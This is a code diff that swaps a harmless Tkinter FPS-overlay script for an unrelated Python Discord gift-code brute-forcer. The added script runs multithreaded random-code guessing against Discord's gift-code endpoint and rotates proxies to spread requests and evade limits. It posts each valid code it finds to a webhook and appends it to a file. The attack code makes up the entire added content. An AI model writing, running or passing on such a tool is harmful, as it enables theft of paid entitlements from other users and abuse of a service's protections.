@@ -1,122 +1,96 @@
-import tkinter as tk
+import random
+import string
+import requests
+import threading
 import time
-import collections
 
-class FPSCounter:
-    """
-    Measures "frames" (dummy operations/ticks) over a rolling 1-second window.
-    This aims to show a fluctuating number representing system responsiveness.
-    """
-    def __init__(self):
-        self.timestamps = collections.deque()
-        self.current_fps = 0
-        self.is_running = True # Control the internal fast loop
+# ========== CONFIGURATION ==========
+WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"
+CHECK_URL = "https://discordapp.com/api/v9/entitlements/gift-codes/{}?with_application=false&with_subscription_plan=true"
+CODE_LENGTH = 18
+THREAD_COUNT = 10
+USE_PROXIES = True
+PROXY_FILE = "proxies.txt"
+DELAY = 0.5  # Delay between attempts (per thread)
 
-    def run_dummy_loop(self):
-        """
-        Runs a very fast loop to generate 'ticks' for FPS calculation.
-        This method will run in the background.
-        """
-        while self.is_running:
-            now = time.perf_counter()
-            self.timestamps.append(now)
+# ========== LOAD PROXIES ==========
+proxies = []
+if USE_PROXIES:
+    try:
+        with open(PROXY_FILE, "r") as f:
+            proxies = [line.strip() for line in f if line.strip()]
+        print(f"[+] Loaded {len(proxies)} proxies.")
+    except FileNotFoundError:
+        print("[!] Proxy file not found. Disabling proxy usage.")
+        USE_PROXIES = False
 
-            # Remove timestamps older than 1 second
-            while self.timestamps and self.timestamps[0] < now - 1.0:
-                self.timestamps.popleft()
+proxy_index = 0
+proxy_lock = threading.Lock()
 
-            self.current_fps = len(self.timestamps) # Number of ticks in the last second
+# ========== CODE GENERATOR ==========
+def generate_code(length=CODE_LENGTH):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
-            # Small sleep to prevent 100% CPU usage for the dummy loop
-            # Adjust as needed; too low might still use significant CPU.
-            # too high, and the FPS will drop significantly.
-            time.sleep(0.001) # Sleep for 1 millisecond
+# ========== CHECK CODE ==========
+def check_code(code):
+    global proxy_index
+    url = CHECK_URL.format(code)
+    headers = {
+        "User-Agent": "Mozilla/5.0",
+        "Accept": "*/*"
+    }
 
-    def get_fps(self):
-        """
-        Returns the calculated FPS.
-        """
-        return self.current_fps
+    proxies_dict = None
+    if USE_PROXIES and proxies:
+        with proxy_lock:
+            proxy = proxies[proxy_index % len(proxies)]
+            proxy_index += 1
+        proxies_dict = {
+            "http": f"http://{proxy}",
+            "https": f"http://{proxy}"
+        }
 
-    def stop(self):
-        """
-        Stops the internal dummy loop.
-        """
-        self.is_running = False
+    try:
+        response = requests.get(url, headers=headers, proxies=proxies_dict, timeout=10)
+        print(f"[{response.status_code}] Checked: {code}")
+        return response.status_code == 200
+    except requests.RequestException as e:
+        print(f"[!] Request failed for code {code} | {e}")
+        return False
 
-def create_overlay_window():
-    """
-    Creates and configures the Tkinter window for the FPS overlay.
-    """
-    root = tk.Tk()
+# ========== WEBHOOK ALERT ==========
+def send_to_webhook(code):
+    data = {
+        "content": f"✅ Valid Code Found: `{code}`"
+    }
+    try:
+        response = requests.post(WEBHOOK_URL, json=data)
+        if response.status_code in [200, 204]:
+            print(f"[+] Webhook sent: {code}")
+        else:
+            print(f"[!] Webhook failed: {response.status_code}")
+    except requests.RequestException as e:
+        print(f"[!] Webhook error: {e}")
 
-    # --- Window Configuration ---
-    root.overrideredirect(True)  # Remove window decorations (title bar, borders)
-    root.attributes("-topmost", True)  # Keep window on top of others
+# ========== SAVE VALID CODE ==========
+def save_valid_code(code):
+    with open("valid_codes.txt", "a") as f:
+        f.write(code + "\n")
 
-    # Set a specific background color that will be made transparent on Windows
-    transparent_color = 'grey15' # A dark grey
-    root.config(bg=transparent_color)
-    root.wm_attributes("-transparentcolor", transparent_color)
+# ========== WORKER LOOP ==========
+def worker():
+    while True:
+        code = generate_code()
+        if check_code(code):
+            send_to_webhook(code)
+            save_valid_code(code)
+        time.sleep(DELAY)
 
-    # --- Label Configuration ---
-    # Changed font size to 12
-    fps_label = tk.Label(root,
-                         text="FPS: ---", # Use three dashes for higher possible values
-                         fg="white",
-                         bg=transparent_color,
-                         font=("Consolas", 12, "bold"))
-    fps_label.pack(expand=True, fill="both", padx=5, pady=2)
-
-    # --- Window Positioning ---
-    screen_width = root.winfo_screenwidth()
-    window_width = 85 # Adjusted for potentially larger numbers (e.g., 3 digits)
-    window_height = 28
-    margin = 10
-    x_position = screen_width - window_width - margin
-    y_position = margin
-    root.geometry(f"{window_width}x{window_height}+{x_position}+{y_position}")
-
-    return root, fps_label
-
-def update_display(root, fps_label, fps_counter):
-    """
-    Updates the FPS display on the label and schedules the next display update.
-    The actual FPS calculation is now happening in the background loop.
-    """
-    # Simply retrieve the current FPS from the background counter
-    # Format to an integer. We no longer force two digits as values can be higher.
-    fps_label.config(text=f"FPS: {int(fps_counter.get_fps()):d}")
-
-    # Schedule this display update function to run again after 1000 milliseconds (1 second)
-    # This is purely for updating the label text, not for running the FPS logic.
-    root.after(1000, lambda: update_display(root, fps_label, fps_counter))
-
-# --- Main execution block ---
+# ========== MAIN ==========
 if __name__ == "__main__":
-    import threading # We need threading for the background loop
+    print(f"[✓] Starting {THREAD_COUNT} threads...\n")
+    for _ in range(THREAD_COUNT):
+        threading.Thread(target=worker, daemon=True).start()
 
-    # 1. Create the overlay window and get the label object
-    root_window, fps_display_label = create_overlay_window()
-
-    # 2. Initialize the FPS counter
-    my_fps_counter = FPSCounter()
-
-    # 3. Start the dummy loop in a separate thread
-    # This loop will continuously generate 'ticks'
-    fps_thread = threading.Thread(target=my_fps_counter.run_dummy_loop, daemon=True)
-    fps_thread.start()
-
-    # 4. Start the display update loop for the FPS display
-    # This will read the FPS from the counter and update the label every second.
-    update_display(root_window, fps_display_label, my_fps_counter)
-
-    # 5. When the Tkinter window closes, tell the background thread to stop
-    def on_closing():
-        my_fps_counter.stop()
-        root_window.destroy()
-
-    root_window.protocol("WM_DELETE_WINDOW", on_closing)
-
-    # 6. Start the Tkinter event loop
-    root_window.mainloop()
+    while True:
+        time.sleep(10)
